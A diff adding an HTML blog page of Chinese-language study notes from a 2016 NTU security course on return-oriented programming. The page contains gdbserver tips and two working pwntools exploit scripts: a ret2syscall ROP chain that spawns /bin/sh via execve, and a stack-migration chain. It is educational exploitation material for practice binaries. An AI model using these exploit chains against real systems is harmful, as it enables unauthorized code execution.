@@ -1,0 +1,291 @@
+<!DOCTYPE html>
+<html lang="en-us">
+  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    
+    <title>NTU STCS 2016学习笔记 0x02 ROP | Kur0&#39;s Blog</title>
+    <meta name="viewport" content="width=device-width,minimum-scale=1">
+    <meta name="description" content="week4 shellcode rop">
+    <meta name="generator" content="Hugo 0.144.2">
+    
+    
+    
+      <meta name="robots" content="noindex, nofollow">
+    
+    
+
+    
+<link rel="stylesheet" href="/ananke/css/main.min.css" >
+
+
+
+
+    
+
+    
+      
+
+    
+
+    
+
+    
+      <link rel="canonical" href="http://localhost:1313/posts/ntu-stcs-2016-w4/">
+    
+
+    <meta property="og:url" content="http://localhost:1313/posts/ntu-stcs-2016-w4/">
+  <meta property="og:site_name" content="Kur0&#39;s Blog">
+  <meta property="og:title" content="NTU STCS 2016学习笔记 0x02 ROP">
+  <meta property="og:description" content="week4 shellcode rop">
+  <meta property="og:locale" content="en_us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2020-08-25T16:46:26+00:00">
+    <meta property="article:modified_time" content="2020-08-25T16:46:26+00:00">
+    <meta property="article:tag" content="Pwn">
+    <meta property="og:image" content="http://localhost:1313/posts/ntu-stcs-2016-w4/cover.jpg">
+
+  <meta itemprop="name" content="NTU STCS 2016学习笔记 0x02 ROP">
+  <meta itemprop="description" content="week4 shellcode rop">
+  <meta itemprop="datePublished" content="2020-08-25T16:46:26+00:00">
+  <meta itemprop="dateModified" content="2020-08-25T16:46:26+00:00">
+  <meta itemprop="wordCount" content="310">
+  <meta itemprop="image" content="http://localhost:1313/posts/ntu-stcs-2016-w4/cover.jpg">
+  <meta itemprop="keywords" content="Pwn">
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:image" content="http://localhost:1313/posts/ntu-stcs-2016-w4/cover.jpg">
+  <meta name="twitter:title" content="NTU STCS 2016学习笔记 0x02 ROP">
+  <meta name="twitter:description" content="week4 shellcode rop">
+
+	
+  </head><body class="ma0 avenir bg-near-white development">
+
+    
+   
+  
+
+  
+  
+  
+  <header class="cover bg-center" style="background-image: url('/posts/ntu-stcs-2016-w4/cover.jpg');">
+    <div class="bg-black-60">
+      <nav class="pv3 ph3 ph4-ns" role="navigation">
+  <div class="flex-l justify-between items-center center">
+    <a href="/" class="f3 fw2 hover-white no-underline white-90 dib">
+      
+        Kur0&#39;s Blog
+      
+    </a>
+    <div class="flex-l items-center">
+      
+
+      
+      <div class="ananke-socials"></div>
+
+    </div>
+  </div>
+</nav>
+
+      <div class="tc-l pv6 ph3 ph4-ns">
+        
+          <div class="f2 f1-l fw2 white-90 mb0 lh-title">NTU STCS 2016学习笔记 0x02 ROP</div>
+          
+            <div class="fw1 f5 f3-l white-80 measure-wide-l center lh-copy mt3 mb4">
+              week4 shellcode rop
+            </div>
+          
+        
+      </div>
+    </div>
+  </header>
+
+
+
+    <main class="pb7" role="main">
+      
+  
+  
+  <article class="flex-l flex-wrap justify-between mw8 center ph3">
+    <header class="mt4 w-100">
+      <aside class="instapaper_ignoref b helvetica tracked ttu">
+          
+        Posts
+      </aside><div id="sharing" class="mt3 ananke-socials"></div>
+<h1 class="f1 athelas mt3 mb1">NTU STCS 2016学习笔记 0x02 ROP</h1>
+      
+      
+      
+      <time class="f6 mv4 dib tracked" datetime="2020-08-25T16:46:26Z">August 25, 2020</time>
+      
+
+      
+      
+    </header>
+    <div class="nested-copy-line-height lh-copy serif f4 nested-links mid-gray pr4-l w-two-thirds-l"><h1 id="gdbserver">gdbserver</h1>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># in bash commandline</span>
+</span></span><span style="display:flex;"><span>gdbserver 127.0.0.1:4000 ./binary <span style="color:#75715e">#break在entrypoint</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># in gdb commandline</span>
+</span></span><span style="display:flex;"><span>gdb ./binary
+</span></span><span style="display:flex;"><span>$ target remote 127.0.0.1:4000
+</span></span><span style="display:flex;"><span>$ <span style="color:#66d9ef">continue</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 搭配ncat</span>
+</span></span><span style="display:flex;"><span>ncat -vc <span style="color:#e6db74">&#39;gdbserver 127.0.0.1:4000 .binary&#39;</span> -kl 127.0.0.1 <span style="color:#ae81ff">5000</span>
+</span></span></code></pre></div><p><strong>trick</strong></p>
+<p>使用gdbscript attach pid</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># .gdbinit</span>
+</span></span><span style="display:flex;"><span>set disassembly-flavor intel
+</span></span><span style="display:flex;"><span>define at
+</span></span><span style="display:flex;"><span>  shell echo attach <span style="color:#66d9ef">$(</span>pidof -s $arg0<span style="color:#66d9ef">)</span> &gt; /tmp/foo.gdb
+</span></span><span style="display:flex;"><span>  source /tmp/foo.gdb
+</span></span><span style="display:flex;"><span>end
+</span></span></code></pre></div><hr>
+<h1 id="rop">rop</h1>
+<p>类型包括:ret2syscall ret2text ret2libc</p>
+<h2 id="rop2syscall">rop2syscall</h2>
+<ul>
+<li>找gadget控制syscall需要的regs(eax,ebx,ecx,edx)</li>
+<li>需要int 80</li>
+</ul>
+<p><strong>RopGadget</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e">#usage</span>
+</span></span><span style="display:flex;"><span>RopGadget --binary ./binary
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#int 80 ; ret</span>
+</span></span><span style="display:flex;"><span>RopGadget --binary ./binary --opcode cd80c3
+</span></span></code></pre></div><blockquote>
+<p>PS:execve需要&rsquo;/bin/sh&rsquo;，且地址必须已知
+用read吧需要的字符串输入至已知地址的buffer上</p></blockquote>
+<p>找可写page用于read(0,buf_addr,len)中的buf_addr
+一般用bss最后一页即可</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cat /proc/<span style="color:#e6db74">`</span>pidof binary<span style="color:#e6db74">`</span>/maps
+</span></span><span style="display:flex;"><span>readelf -a binary | less <span style="color:#75715e"># 看Section Headers中的.bss</span>
+</span></span></code></pre></div><p>eg.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env python</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>arch <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;i386&#39;</span>
+</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#39;./p1&#39;</span>)
+</span></span><span style="display:flex;"><span>elf <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;./p1&#39;</span>)
+</span></span><span style="display:flex;"><span>g <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> x: next(elf<span style="color:#f92672">.</span>search(asm(x)))
+</span></span><span style="display:flex;"><span>pop_eax_ret <span style="color:#f92672">=</span> g(<span style="color:#e6db74">&#39;pop eax ; ret&#39;</span>) <span style="color:#75715e"># 0x080b8126</span>
+</span></span><span style="display:flex;"><span>pop_ebx_ret <span style="color:#f92672">=</span> g(<span style="color:#e6db74">&#39;pop ebx ; ret&#39;</span>) <span style="color:#75715e"># 0x080481c9</span>
+</span></span><span style="display:flex;"><span>pop_ecx_ret <span style="color:#f92672">=</span> g(<span style="color:#e6db74">&#39;pop ecx ; ret&#39;</span>) <span style="color:#75715e"># 0x080de849</span>
+</span></span><span style="display:flex;"><span>pop_edx_ret <span style="color:#f92672">=</span> g(<span style="color:#e6db74">&#39;pop edx ; ret&#39;</span>) <span style="color:#75715e"># 0x0806edca</span>
+</span></span><span style="display:flex;"><span>int_0x80_ret <span style="color:#f92672">=</span> g(<span style="color:#e6db74">&#39;int 0x80 ; ret&#39;</span>)
+</span></span><span style="display:flex;"><span>buf <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x080eb000</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">100</span>
+</span></span><span style="display:flex;"><span>raw_input(<span style="color:#e6db74">&#39;@&#39;</span>)
+</span></span><span style="display:flex;"><span>offset <span style="color:#f92672">=</span> <span style="color:#ae81ff">62</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># read(0, &#39;/bin/sh\x00&#39;, 100)</span>
+</span></span><span style="display:flex;"><span>rop1 <span style="color:#f92672">=</span> [
+</span></span><span style="display:flex;"><span>	pop_eax_ret,
+</span></span><span style="display:flex;"><span>	<span style="color:#ae81ff">3</span>,
+</span></span><span style="display:flex;"><span>	pop_ebx_ret,
+</span></span><span style="display:flex;"><span>	<span style="color:#ae81ff">0</span>,
+</span></span><span style="display:flex;"><span>	pop_ecx_ret,
+</span></span><span style="display:flex;"><span>	buf,
+</span></span><span style="display:flex;"><span>	pop_edx_ret,
+</span></span><span style="display:flex;"><span>	<span style="color:#ae81ff">100</span>,
+</span></span><span style="display:flex;"><span>	int_0x80_ret,
+</span></span><span style="display:flex;"><span>]
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># execve(&#39;/bin/sh\x00&#39;, 0, 0)</span>
+</span></span><span style="display:flex;"><span>rop2 <span style="color:#f92672">=</span> [
+</span></span><span style="display:flex;"><span>	pop_eax_ret,
+</span></span><span style="display:flex;"><span>	<span style="color:#ae81ff">0xb</span>,
+</span></span><span style="display:flex;"><span>	pop_ebx_ret,
+</span></span><span style="display:flex;"><span>	buf,
+</span></span><span style="display:flex;"><span>	pop_ecx_ret,
+</span></span><span style="display:flex;"><span>	<span style="color:#ae81ff">0</span>,
+</span></span><span style="display:flex;"><span>	pop_edx_ret,
+</span></span><span style="display:flex;"><span>	<span style="color:#ae81ff">0</span>,
+</span></span><span style="display:flex;"><span>	int_0x80_ret
+</span></span><span style="display:flex;"><span>]
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;A&#39;</span> <span style="color:#f92672">*</span> offset <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">.</span>join(map(p32, rop1)) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">.</span>join(map(p32, rop2))
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(payload)
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#39;/bin/sh</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>)
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>interactive()
+</span></span></code></pre></div><h3 id="使用较长的gadget">使用较长的gadget</h3>
+<p><img src="w4-long-gadget.png" alt="long gadget"></p>
+<p><strong>leave指令</strong></p>
+<pre tabindex="0"><code class="language-x86asm" data-lang="x86asm">#leave
+mov   esp, ebp
+pop   ebp
+</code></pre><p><strong>Trick: Stack Migration</strong></p>
+<ul>
+<li>使用leave把栈放到已知位置</li>
+<li>确定rop chain的位置时可以直接附加其他data</li>
+<li>可以无限rop</li>
+<li>migrate后的空间要足够</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>gadget1 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x8048898</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># gadget1 has gets() and leave_ret</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 8048898:       50                      push   eax</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 8048899:       e8 e2 69 00 00          call   804f280 &lt;_IO_gets&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 804889e:       83 c4 10                add    esp,0x10</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 80488a1:       90                      nop</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 80488a2:       c9                      leave</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 80488a3:       c3                      ret</span>
+</span></span><span style="display:flex;"><span>migration <span style="color:#f92672">=</span> [
+</span></span><span style="display:flex;"><span>    pop_ebp_ret,
+</span></span><span style="display:flex;"><span>    buf <span style="color:#f92672">-</span> <span style="color:#ae81ff">4</span>,  <span style="color:#75715e">#leave会pop ebp，所以要控制到buf-4位置</span>
+</span></span><span style="display:flex;"><span>    pop_eax_ret,
+</span></span><span style="display:flex;"><span>    buf,
+</span></span><span style="display:flex;"><span>    gadget1,
+</span></span><span style="display:flex;"><span>]
+</span></span><span style="display:flex;"><span>rop <span style="color:#f92672">=</span> [
+</span></span><span style="display:flex;"><span>    pop_eax_ret,
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0xb</span>,
+</span></span><span style="display:flex;"><span>    pop_ebx_ret,
+</span></span><span style="display:flex;"><span>    buf <span style="color:#f92672">+</span> <span style="color:#ae81ff">9</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">4</span>,  <span style="color:#75715e">#ropchain一共有9*4bytes</span>
+</span></span><span style="display:flex;"><span>    pop_ecx_ret,
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0</span>,
+</span></span><span style="display:flex;"><span>    pop_edx_ret,
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0</span>,
+</span></span><span style="display:flex;"><span>    int_0x80_ret
+</span></span><span style="display:flex;"><span>]
+</span></span><span style="display:flex;"><span>payload1 <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;A&#39;</span> <span style="color:#f92672">*</span> offset <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">.</span>join(map(p32, migration))
+</span></span><span style="display:flex;"><span>payload2 <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">.</span>join(map(p32, rop)) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;/bin/sh</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>
+</span></span></code></pre></div><ul class="pa0">
+  
+   <li class="list di">
+     <a href="/tags/pwn/" class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif">Pwn</a>
+   </li>
+  
+</ul>
+<div class="mt6 instapaper_ignoref">
+      
+      
+      </div>
+    </div>
+
+    <aside class="w-30-l mt6-l">
+
+
+
+
+  <div class="bg-light-gray pa3 nested-list-reset nested-copy-line-height nested-links">
+    <p class="f5 b mb3">Related</p>
+    <ul class="pa0 list">
+	   
+	     <li  class="mb2">
+          <a href="/posts/ntu-stcs-2016-w3/">NTU STCS 2016学习笔记 0x01 Intro</a>
+        </li>
+	    
+    </ul>
+</div>
+
+</aside>
+
+  </article>
+
+    </main>
+    <footer class="bg-black bottom-0 w-100 pa3" role="contentinfo">
+  <div class="flex justify-between">
+  <a class="f4 fw4 hover-white no-underline white-70 dn dib-ns pv2 ph3" href="http://localhost:1313/" >
+    &copy;  Kur0's Blog 2025 
+  </a>
+    <div><div class="ananke-socials"></div>
+</div>
+  </div>
+</footer>
+
+  </body>
+</html>
